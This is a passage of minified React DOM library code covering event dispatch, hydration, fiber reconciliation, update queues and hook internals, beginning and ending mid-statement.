f(h,v,null,n,p),d.push({event:h,listeners:y}))}}if(!(e&7)){e:{if(h=t==="mouseover"||t==="pointerover",f=t==="mouseout"||t==="pointerout",h&&n!==Mu&&(v=n.relatedTarget||n.fromElement)&&(Ts(v)||v[Ci]))break e;if((f||h)&&(h=p.window===p?p:(h=p.ownerDocument)?h.defaultView||h.parentWindow:window,f?(v=n.relatedTarget||n.toElement,f=c,v=v?Ts(v):null,v!==null&&(m=zs(v),v!==m||v.tag!==5&&v.tag!==6)&&(v=null)):(f=null,v=c),f!==v)){if(y=Bh,b="onMouseLeave",u="onMouseEnter",g="mouse",(t==="pointerout"||t==="pointerover")&&(y=Vh,b="onPointerLeave",u="onPointerEnter",g="pointer"),m=f==null?h:cr(f),_=v==null?h:cr(v),h=new y(b,g+"leave",f,n,p),h.target=m,h.relatedTarget=_,b=null,Ts(p)===c&&(y=new y(u,g+"enter",v,n,p),y.target=_,y.relatedTarget=m,b=y),m=b,f&&v)t:{for(y=f,u=v,g=0,_=y;_;_=Gs(_))g++;for(_=0,b=u;b;b=Gs(b))_++;for(;0<g-_;)y=Gs(y),g--;for(;0<_-g;)u=Gs(u),_--;for(;g--;){if(y===u||u!==null&&y===u.alternate)break t;y=Gs(y),u=Gs(u)}y=null}else y=null;f!==null&&Jh(d,h,f,y,!1),v!==null&&m!==null&&Jh(d,m,v,y,!0)}}e:{if(h=c?cr(c):window,f=h.nodeName&&h.nodeName.toLowerCase(),f==="select"||f==="input"&&h.type==="file")var T=zx;else if(Wh(h))if(Vg)T=Wx;else{T=Hx;var A=Vx}else(f=h.nodeName)&&f.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(T=Gx);if(T&&(T=T(t,c))){zg(d,T,n,p);break e}A&&A(t,h,c),t==="focusout"&&(A=h._wrapperState)&&A.controlled&&h.type==="number"&&yu(h,"number",h.value)}switch(A=c?cr(c):window,t){case"focusin":(Wh(A)||A.contentEditable==="true")&&(or=A,Lu=c,ga=null);break;case"focusout":ga=Lu=or=null;break;case"mousedown":Nu=!0;break;case"contextmenu":case"mouseup":case"dragend":Nu=!1,$h(d,n,p);break;case"selectionchange":if(qx)break;case"keydown":case"keyup":$h(d,n,p)}var C;if(yp)e:{switch(t){case"compositionstart":var L="onCompositionStart";break e;case"compositionend":L="onCompositionEnd";break e;case"compositionupdate":L="onCompositionUpdate";break e}L=void 0}else ar?Fg(t,n)&&(L="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(L="onCompositionStart");L&&(Og&&n.locale!=="ko"&&(ar||L!=="onCompositionStart"?L==="onCompositionEnd"&&ar&&(C=Ug()):(qi=p,vp="value"in qi?qi.value:qi.textContent,ar=!0)),A=ml(c,L),0<A.length&&(L=new zh(L,t,null,n,p),d.push({event:L,listeners:A}),C?L.data=C:(C=Bg(n),C!==null&&(L.data=C)))),(C=Dx?Ux(t,n):Ox(t,n))&&(c=ml(c,"onBeforeInput"),0<c.length&&(p=new zh("onBeforeInput","beforeinput",null,n,p),d.push({event:p,listeners:c}),p.data=C))}Zg(d,e)})}function Pa(t,e,n){return{instance:t,listener:e,currentTarget:n}}function ml(t,e){for(var n=e+"Capture",i=[];t!==null;){var s=t,r=s.stateNode;s.tag===5&&r!==null&&(s=r,r=wa(t,n),r!=null&&i.unshift(Pa(t,r,s)),r=wa(t,e),r!=null&&i.push(Pa(t,r,s))),t=t.return}return i}function Gs(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function Jh(t,e,n,i,s){for(var r=e._reactName,a=[];n!==null&&n!==i;){var o=n,l=o.alternate,c=o.stateNode;if(l!==null&&l===i)break;o.tag===5&&c!==null&&(o=c,s?(l=wa(n,r),l!=null&&a.unshift(Pa(n,l,o))):s||(l=wa(n,r),l!=null&&a.push(Pa(n,l,o)))),n=n.return}a.length!==0&&t.push({event:e,listeners:a})}var Zx=/\r\n?/g,Jx=/\u0000|\uFFFD/g;function Qh(t){return(typeof t=="string"?t:""+t).replace(Zx,`
`).replace(Jx,"")}function vo(t,e,n){if(e=Qh(e),Qh(t)!==e&&n)throw Error(se(425))}function gl(){}var Iu=null,Du=null;function Uu(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Ou=typeof setTimeout=="function"?setTimeout:void 0,Qx=typeof clearTimeout=="function"?clearTimeout:void 0,ef=typeof Promise=="function"?Promise:void 0,ey=typeof queueMicrotask=="function"?queueMicrotask:typeof ef<"u"?function(t){return ef.resolve(null).then(t).catch(ty)}:Ou;function ty(t){setTimeout(function(){throw t})}function wc(t,e){var n=e,i=0;do{var s=n.nextSibling;if(t.removeChild(n),s&&s.nodeType===8)if(n=s.data,n==="/$"){if(i===0){t.removeChild(s),Ta(e);return}i--}else n!=="$"&&n!=="$?"&&n!=="$!"||i++;n=s}while(n);Ta(e)}function es(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function tf(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var Br=Math.random().toString(36).slice(2),ti="__reactFiber$"+Br,ka="__reactProps$"+Br,Ci="__reactContainer$"+Br,Fu="__reactEvents$"+Br,ny="__reactListeners$"+Br,iy="__reactHandles$"+Br;function Ts(t){var e=t[ti];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Ci]||n[ti]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=tf(t);t!==null;){if(n=t[ti])return n;t=tf(t)}return e}t=n,n=t.parentNode}return null}function $a(t){return t=t[ti]||t[Ci],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function cr(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(se(33))}function Hl(t){return t[ka]||null}var Bu=[],ur=-1;function us(t){return{current:t}}function ht(t){0>ur||(t.current=Bu[ur],Bu[ur]=null,ur--)}function dt(t,e){ur++,Bu[ur]=t.current,t.current=e}var os={},Kt=us(os),un=us(!1),Ns=os;function Tr(t,e){var n=t.type.contextTypes;if(!n)return os;var i=t.stateNode;if(i&&i.__reactInternalMemoizedUnmaskedChildContext===e)return i.__reactInternalMemoizedMaskedChildContext;var s={},r;for(r in n)s[r]=e[r];return i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=s),s}function dn(t){return t=t.childContextTypes,t!=null}function vl(){ht(un),ht(Kt)}function nf(t,e,n){if(Kt.current!==os)throw Error(se(168));dt(Kt,e),dt(un,n)}function Qg(t,e,n){var i=t.stateNode;if(e=e.childContextTypes,typeof i.getChildContext!="function")return n;i=i.getChildContext();for(var s in i)if(!(s in e))throw Error(se(108,V_(t)||"Unknown",s));return vt({},n,i)}function _l(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||os,Ns=Kt.current,dt(Kt,t),dt(un,un.current),!0}function sf(t,e,n){var i=t.stateNode;if(!i)throw Error(se(169));n?(t=Qg(t,e,Ns),i.__reactInternalMemoizedMergedChildContext=t,ht(un),ht(Kt),dt(Kt,t)):ht(un),dt(un,n)}var xi=null,Gl=!1,Ec=!1;function ev(t){xi===null?xi=[t]:xi.push(t)}function sy(t){Gl=!0,ev(t)}function ds(){if(!Ec&&xi!==null){Ec=!0;var t=0,e=st;try{var n=xi;for(st=1;t<n.length;t++){var i=n[t];do i=i(!0);while(i!==null)}xi=null,Gl=!1}catch(s){throw xi!==null&&(xi=xi.slice(t+1)),Mg(hp,ds),s}finally{st=e,Ec=!1}}return null}var dr=[],pr=0,xl=null,yl=0,Rn=[],Pn=0,Is=null,Si=1,bi="";function Ss(t,e){dr[pr++]=yl,dr[pr++]=xl,xl=t,yl=e}function tv(t,e,n){Rn[Pn++]=Si,Rn[Pn++]=bi,Rn[Pn++]=Is,Is=t;var i=Si;t=bi;var s=32-Xn(i)-1;i&=~(1<<s),n+=1;var r=32-Xn(e)+s;if(30<r){var a=s-s%5;r=(i&(1<<a)-1).toString(32),i>>=a,s-=a,Si=1<<32-Xn(e)+s|n<<s|i,bi=r+t}else Si=1<<r|n<<s|i,bi=t}function bp(t){t.return!==null&&(Ss(t,1),tv(t,1,0))}function wp(t){for(;t===xl;)xl=dr[--pr],dr[pr]=null,yl=dr[--pr],dr[pr]=null;for(;t===Is;)Is=Rn[--Pn],Rn[Pn]=null,bi=Rn[--Pn],Rn[Pn]=null,Si=Rn[--Pn],Rn[Pn]=null}var bn=null,Sn=null,ft=!1,Hn=null;function nv(t,e){var n=kn(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function rf(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,bn=t,Sn=es(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,bn=t,Sn=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=Is!==null?{id:Si,overflow:bi}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=kn(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,bn=t,Sn=null,!0):!1;default:return!1}}function zu(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Vu(t){if(ft){var e=Sn;if(e){var n=e;if(!rf(t,e)){if(zu(t))throw Error(se(418));e=es(n.nextSibling);var i=bn;e&&rf(t,e)?nv(i,n):(t.flags=t.flags&-4097|2,ft=!1,bn=t)}}else{if(zu(t))throw Error(se(418));t.flags=t.flags&-4097|2,ft=!1,bn=t}}}function af(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;bn=t}function _o(t){if(t!==bn)return!1;if(!ft)return af(t),ft=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Uu(t.type,t.memoizedProps)),e&&(e=Sn)){if(zu(t))throw iv(),Error(se(418));for(;e;)nv(t,e),e=es(e.nextSibling)}if(af(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(se(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){Sn=es(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}Sn=null}}else Sn=bn?es(t.stateNode.nextSibling):null;return!0}function iv(){for(var t=Sn;t;)t=es(t.nextSibling)}function Ar(){Sn=bn=null,ft=!1}function Ep(t){Hn===null?Hn=[t]:Hn.push(t)}var ry=Ni.ReactCurrentBatchConfig;function $r(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(se(309));var i=n.stateNode}if(!i)throw Error(se(147,t));var s=i,r=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===r?e.ref:(e=function(a){var o=s.refs;a===null?delete o[r]:o[r]=a},e._stringRef=r,e)}if(typeof t!="string")throw Error(se(284));if(!n._owner)throw Error(se(290,t))}return t}function xo(t,e){throw t=Object.prototype.toString.call(e),Error(se(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function of(t){var e=t._init;return e(t._payload)}function sv(t){function e(u,g){if(t){var _=u.deletions;_===null?(u.deletions=[g],u.flags|=16):_.push(g)}}function n(u,g){if(!t)return null;for(;g!==null;)e(u,g),g=g.sibling;return null}function i(u,g){for(u=new Map;g!==null;)g.key!==null?u.set(g.key,g):u.set(g.index,g),g=g.sibling;return u}function s(u,g){return u=ss(u,g),u.index=0,u.sibling=null,u}function r(u,g,_){return u.index=_,t?(_=u.alternate,_!==null?(_=_.index,_<g?(u.flags|=2,g):_):(u.flags|=2,g)):(u.flags|=1048576,g)}function a(u){return t&&u.alternate===null&&(u.flags|=2),u}function o(u,g,_,b){return g===null||g.tag!==6?(g=kc(_,u.mode,b),g.return=u,g):(g=s(g,_),g.return=u,g)}function l(u,g,_,b){var T=_.type;return T===rr?p(u,g,_.props.children,b,_.key):g!==null&&(g.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Hi&&of(T)===g.type)?(b=s(g,_.props),b.ref=$r(u,g,_),b.return=u,b):(b=tl(_.type,_.key,_.props,null,u.mode,b),b.ref=$r(u,g,_),b.return=u,b)}function c(u,g,_,b){return g===null||g.tag!==4||g.stateNode.containerInfo!==_.containerInfo||g.stateNode.implementation!==_.implementation?(g=Lc(_,u.mode,b),g.return=u,g):(g=s(g,_.children||[]),g.return=u,g)}function p(u,g,_,b,T){return g===null||g.tag!==7?(g=Ls(_,u.mode,b,T),g.return=u,g):(g=s(g,_),g.return=u,g)}function d(u,g,_){if(typeof g=="string"&&g!==""||typeof g=="number")return g=kc(""+g,u.mode,_),g.return=u,g;if(typeof g=="object"&&g!==null){switch(g.$$typeof){case oo:return _=tl(g.type,g.key,g.props,null,u.mode,_),_.ref=$r(u,null,g),_.return=u,_;case sr:return g=Lc(g,u.mode,_),g.return=u,g;case Hi:var b=g._init;return d(u,b(g._payload),_)}if(aa(g)||Wr(g))return g=Ls(g,u.mode,_,null),g.return=u,g;xo(u,g)}return null}function h(u,g,_,b){var T=g!==null?g.key:null;if(typeof _=="string"&&_!==""||typeof _=="number")return T!==null?null:o(u,g,""+_,b);if(typeof _=="object"&&_!==null){switch(_.$$typeof){case oo:return _.key===T?l(u,g,_,b):null;case sr:return _.key===T?c(u,g,_,b):null;case Hi:return T=_._init,h(u,g,T(_._payload),b)}if(aa(_)||Wr(_))return T!==null?null:p(u,g,_,b,null);xo(u,_)}return null}function f(u,g,_,b,T){if(typeof b=="string"&&b!==""||typeof b=="number")return u=u.get(_)||null,o(g,u,""+b,T);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case oo:return u=u.get(b.key===null?_:b.key)||null,l(g,u,b,T);case sr:return u=u.get(b.key===null?_:b.key)||null,c(g,u,b,T);case Hi:var A=b._init;return f(u,g,_,A(b._payload),T)}if(aa(b)||Wr(b))return u=u.get(_)||null,p(g,u,b,T,null);xo(g,b)}return null}function v(u,g,_,b){for(var T=null,A=null,C=g,L=g=0,w=null;C!==null&&L<_.length;L++){C.index>L?(w=C,C=null):w=C.sibling;var E=h(u,C,_[L],b);if(E===null){C===null&&(C=w);break}t&&C&&E.alternate===null&&e(u,C),g=r(E,g,L),A===null?T=E:A.sibling=E,A=E,C=w}if(L===_.length)return n(u,C),ft&&Ss(u,L),T;if(C===null){for(;L<_.length;L++)C=d(u,_[L],b),C!==null&&(g=r(C,g,L),A===null?T=C:A.sibling=C,A=C);return ft&&Ss(u,L),T}for(C=i(u,C);L<_.length;L++)w=f(C,u,L,_[L],b),w!==null&&(t&&w.alternate!==null&&C.delete(w.key===null?L:w.key),g=r(w,g,L),A===null?T=w:A.sibling=w,A=w);return t&&C.forEach(function(P){return e(u,P)}),ft&&Ss(u,L),T}function y(u,g,_,b){var T=Wr(_);if(typeof T!="function")throw Error(se(150));if(_=T.call(_),_==null)throw Error(se(151));for(var A=T=null,C=g,L=g=0,w=null,E=_.next();C!==null&&!E.done;L++,E=_.next()){C.index>L?(w=C,C=null):w=C.sibling;var P=h(u,C,E.value,b);if(P===null){C===null&&(C=w);break}t&&C&&P.alternate===null&&e(u,C),g=r(P,g,L),A===null?T=P:A.sibling=P,A=P,C=w}if(E.done)return n(u,C),ft&&Ss(u,L),T;if(C===null){for(;!E.done;L++,E=_.next())E=d(u,E.value,b),E!==null&&(g=r(E,g,L),A===null?T=E:A.sibling=E,A=E);return ft&&Ss(u,L),T}for(C=i(u,C);!E.done;L++,E=_.next())E=f(C,u,L,E.value,b),E!==null&&(t&&E.alternate!==null&&C.delete(E.key===null?L:E.key),g=r(E,g,L),A===null?T=E:A.sibling=E,A=E);return t&&C.forEach(function(G){return e(u,G)}),ft&&Ss(u,L),T}function m(u,g,_,b){if(typeof _=="object"&&_!==null&&_.type===rr&&_.key===null&&(_=_.props.children),typeof _=="object"&&_!==null){switch(_.$$typeof){case oo:e:{for(var T=_.key,A=g;A!==null;){if(A.key===T){if(T=_.type,T===rr){if(A.tag===7){n(u,A.sibling),g=s(A,_.props.children),g.return=u,u=g;break e}}else if(A.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Hi&&of(T)===A.type){n(u,A.sibling),g=s(A,_.props),g.ref=$r(u,A,_),g.return=u,u=g;break e}n(u,A);break}else e(u,A);A=A.sibling}_.type===rr?(g=Ls(_.props.children,u.mode,b,_.key),g.return=u,u=g):(b=tl(_.type,_.key,_.props,null,u.mode,b),b.ref=$r(u,g,_),b.return=u,u=b)}return a(u);case sr:e:{for(A=_.key;g!==null;){if(g.key===A)if(g.tag===4&&g.stateNode.containerInfo===_.containerInfo&&g.stateNode.implementation===_.implementation){n(u,g.sibling),g=s(g,_.children||[]),g.return=u,u=g;break e}else{n(u,g);break}else e(u,g);g=g.sibling}g=Lc(_,u.mode,b),g.return=u,u=g}return a(u);case Hi:return A=_._init,m(u,g,A(_._payload),b)}if(aa(_))return v(u,g,_,b);if(Wr(_))return y(u,g,_,b);xo(u,_)}return typeof _=="string"&&_!==""||typeof _=="number"?(_=""+_,g!==null&&g.tag===6?(n(u,g.sibling),g=s(g,_),g.return=u,u=g):(n(u,g),g=kc(_,u.mode,b),g.return=u,u=g),a(u)):n(u,g)}return m}var Cr=sv(!0),rv=sv(!1),Sl=us(null),bl=null,hr=null,Mp=null;function Tp(){Mp=hr=bl=null}function Ap(t){var e=Sl.current;ht(Sl),t._currentValue=e}function Hu(t,e,n){for(;t!==null;){var i=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,i!==null&&(i.childLanes|=e)):i!==null&&(i.childLanes&e)!==e&&(i.childLanes|=e),t===n)break;t=t.return}}function Sr(t,e){bl=t,Mp=hr=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(cn=!0),t.firstContext=null)}function In(t){var e=t._currentValue;if(Mp!==t)if(t={context:t,memoizedValue:e,next:null},hr===null){if(bl===null)throw Error(se(308));hr=t,bl.dependencies={lanes:0,firstContext:t}}else hr=hr.next=t;return e}var As=null;function Cp(t){As===null?As=[t]:As.push(t)}function av(t,e,n,i){var s=e.interleaved;return s===null?(n.next=n,Cp(e)):(n.next=s.next,s.next=n),e.interleaved=n,Ri(t,i)}function Ri(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var Gi=!1;function Rp(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function ov(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Ei(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function ts(t,e,n){var i=t.updateQueue;if(i===null)return null;if(i=i.shared,Xe&2){var s=i.pending;return s===null?e.next=e:(e.next=s.next,s.next=e),i.pending=e,Ri(t,n)}return s=i.interleaved,s===null?(e.next=e,Cp(i)):(e.next=s.next,s.next=e),i.interleaved=e,Ri(t,n)}function $o(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,fp(t,n)}}function lf(t,e){var n=t.updateQueue,i=t.alternate;if(i!==null&&(i=i.updateQueue,n===i)){var s=null,r=null;if(n=n.firstBaseUpdate,n!==null){do{var a={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};r===null?s=r=a:r=r.next=a,n=n.next}while(n!==null);r===null?s=r=e:r=r.next=e}else s=r=e;n={baseState:i.baseState,firstBaseUpdate:s,lastBaseUpdate:r,shared:i.shared,effects:i.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function wl(t,e,n,i){var s=t.updateQueue;Gi=!1;var r=s.firstBaseUpdate,a=s.lastBaseUpdate,o=s.shared.pending;if(o!==null){s.shared.pending=null;var l=o,c=l.next;l.next=null,a===null?r=c:a.next=c,a=l;var p=t.alternate;p!==null&&(p=p.updateQueue,o=p.lastBaseUpdate,o!==a&&(o===null?p.firstBaseUpdate=c:o.next=c,p.lastBaseUpdate=l))}if(r!==null){var d=s.baseState;a=0,p=c=l=null,o=r;do{var h=o.lane,f=o.eventTime;if((i&h)===h){p!==null&&(p=p.next={eventTime:f,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var v=t,y=o;switch(h=e,f=n,y.tag){case 1:if(v=y.payload,typeof v=="function"){d=v.call(f,d,h);break e}d=v;break e;case 3:v.flags=v.flags&-65537|128;case 0:if(v=y.payload,h=typeof v=="function"?v.call(f,d,h):v,h==null)break e;d=vt({},d,h);break e;case 2:Gi=!0}}o.callback!==null&&o.lane!==0&&(t.flags|=64,h=s.effects,h===null?s.effects=[o]:h.push(o))}else f={eventTime:f,lane:h,tag:o.tag,payload:o.payload,callback:o.callback,next:null},p===null?(c=p=f,l=d):p=p.next=f,a|=h;if(o=o.next,o===null){if(o=s.shared.pending,o===null)break;h=o,o=h.next,h.next=null,s.lastBaseUpdate=h,s.shared.pending=null}}while(!0);if(p===null&&(l=d),s.baseState=l,s.firstBaseUpdate=c,s.lastBaseUpdate=p,e=s.shared.interleaved,e!==null){s=e;do a|=s.lane,s=s.next;while(s!==e)}else r===null&&(s.shared.lanes=0);Us|=a,t.lanes=a,t.memoizedState=d}}function cf(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var i=t[e],s=i.callback;if(s!==null){if(i.callback=null,i=n,typeof s!="function")throw Error(se(191,s));s.call(i)}}}var Ka={},ri=us(Ka),La=us(Ka),Na=us(Ka);function Cs(t){if(t===Ka)throw Error(se(174));return t}function Pp(t,e){switch(dt(Na,e),dt(La,t),dt(ri,Ka),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:bu(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=bu(e,t)}ht(ri),dt(ri,e)}function Rr(){ht(ri),ht(La),ht(Na)}function lv(t){Cs(Na.current);var e=Cs(ri.current),n=bu(e,t.type);e!==n&&(dt(La,t),dt(ri,n))}function kp(t){La.current===t&&(ht(ri),ht(La))}var mt=us(0);function El(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Mc=[];function Lp(){for(var t=0;t<Mc.length;t++)Mc[t]._workInProgressVersionPrimary=null;Mc.length=0}var Ko=Ni.ReactCurrentDispatcher,Tc=Ni.ReactCurrentBatchConfig,Ds=0,gt=null,Rt=null,Dt=null,Ml=!1,va=!1,Ia=0,ay=0;function Ht(){throw Error(se(321))}function Np(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!Yn(t[n],e[n]))return!1;return!0}function Ip(t,e,n,i,s,r){if(Ds=r,gt=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Ko.current=t===null||t.memoizedState===null?uy:dy,t=n(i,s),va){r=0;do{if(va=!1,Ia=0,25<=r)throw Error(se(301));r+=1,Dt=Rt=null,e.updateQueue=null,Ko.current=py,t=n(i,s)}while(va)}if(Ko.current=Tl,e=Rt!==null&&Rt.next!==null,Ds=0,Dt=Rt=gt=null,Ml=!1,e)throw Error(se(300));return t}function Dp(){var t=Ia!==0;return Ia=0,t}function Qn(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Dt===null?gt.memoizedState=Dt=t:Dt=Dt.next=t,Dt}function Dn(){if(Rt===null){var t=gt.alternate;t=t!==null?t.memoizedState:null}else t=Rt.next;var e=Dt===null?gt.memoizedState:Dt.next;if(e!==null)Dt=e,Rt=t;else{if(t===null)throw Error(se(310));Rt=t,t={memoizedState:Rt.memoizedState,baseState:Rt.baseState,baseQueue:Rt.baseQueue,queue:Rt.queue,next:null},Dt===null?gt.memoizedState=Dt=t:Dt=Dt.next=t}return Dt}function Da(t,e){return typeof e=="function"?e(t):e}function Ac(t){var e=Dn(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=Rt,s=i.baseQueue,r=n.pending;if(r!==null){if(s!==null){var a=s.next;s.next=r.next,r.next=a}i.baseQueue=s=r,n.pending=null}if(s!==null){r=s.next,i=i.baseState;var o=a=null,l=null,c=r;do{var p=c.lane;if((Ds&p)===p)l!==null&&(l=l.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),i=c.hasEagerState?c.eagerState:t(i,c.action);else{var d={lane:p,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};l===null?(o=l=d,a=i):l=l.next=d,gt.lanes|=p,Us|=p}c=c.next}while(c!==null&&c!==r);l===null?a=i:l.next=o,Yn(i,e.memoizedState)||(cn=!0),e.memoizedState=i,e.baseState=a,e.baseQueue=l,n.lastRenderedState=i}if(t=n.interleaved,t!==null){s=t;do r=s.lane,gt.lanes|=r,Us|=r,s=s.next;while(s!==t)}else s===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Cc(t){var e=Dn(),n=e.queue;if(n===null)throw Error(se(311));n.lastRenderedReducer=t;var i=n.dispatch,s=n.pending,r=e.memoizedState;if(s!==null){n.pending=null;var a=s=s.next;do r=t(r,a.action),a=a.next;while(a!==s);Yn(r,e.memoizedState)||(cn=!0),e.memoizedState=r,e.baseQueue===null&&(e.baseState=r),n.lastRenderedState=r}return[r,i]}function cv(){}function uv(t,e){var n=gt,i=Dn(),s=e(),r=!Yn(i.memoizedState,s);if(r&&(i.memoizedState=s,cn=!0),i=i.queue,Up(hv.bind(null,n,i,t),[t]),i.getSnapshot!==e||r||Dt!==null&&Dt.memoizedState.tag&1){if(n.flags|=2048,Ua(9,pv.bind(null,n,i,s,e),void 0,null),Ut===null)throw Error(se(349));Ds&30||dv(n,e,s)}return s}function dv(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=gt.updateQueue,e===null?(e={lastEffect:null,stores:null},gt.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function pv(t,e,n,i){e.value=n,e.getSnapshot=i,fv(e)&&mv(t)}function hv(t,e,n){return n(function(){fv(e)&&mv(t)})}function fv(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!Yn(t,n)}catch{return!0}}function mv(t){var e=Ri(t,1);e!==null&&qn(e,t,1,-1)}function uf(t){var e=Qn();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Da,lastRenderedState:t},e.queue=t,t=t.dispatch=cy.bind(null,gt,t),[e.memoizedState,t]}function Ua(t,e,n,i){return t={tag:t,create:e,destroy:n,deps:i,next:null},e=gt.updateQueue,e===null?(e={lastEffect:null,stores:null},gt.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(i=n.next,n.next=t,t.next=i,e.lastEffect=t)),t}function gv(){return Dn().memoizedState}function Zo(t,e,n,i){var s=Qn();gt.flags|=t,s.memoizedState=Ua(1|e,n,void 0,i===void 0?null:i)}function Wl(t,e,n,i){var s=Dn();i=i===void 0?null:i;var r=void 0;if(Rt!==null){var a=Rt.memoizedState;if(r=a.destroy,i!==null&&Np(i,a.deps)){s.memoizedState=Ua(e,n,r,i);return}}gt.flags|=t,s.memoizedState=Ua(1|e,n,r,i)}function df(t,e){return Zo(8390656,8,t,e)}function Up(t,e){return Wl(2048,8,t,e)}function vv(t,e){return Wl(4,2,t,e)}function _v(t,e){return Wl(4,4,t,e)}function xv(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function yv(t,e,n){return n=n!=null?n.concat([t]):null,Wl(4,4,xv.bind(null,e,t),n)}function Op(){}function Sv(t,e){var n=Dn();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Np(e,i[1])?i[0]:(n.memoizedState=[t,e],t)}function bv(t,e){var n=Dn();e=e===void 0?null:e;var i=n.memoizedState;return i!==null&&e!==null&&Np(e,i[1])?i[0]:(t=t(),n.memoizedState=[t,e],t)}function wv(t,e,n){return Ds&21?(Yn(n,e)||(n=Cg(),gt.lanes|=n,Us|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,cn=!0),t.memoizedState=n)}function oy(t,e){var n=st;st=n!==0&&4>n?n:4,t(!0);var i=Tc.transition;Tc.transition={};try{t(!1),e()}finally{st=n,Tc.transition=i}}function Ev(){return 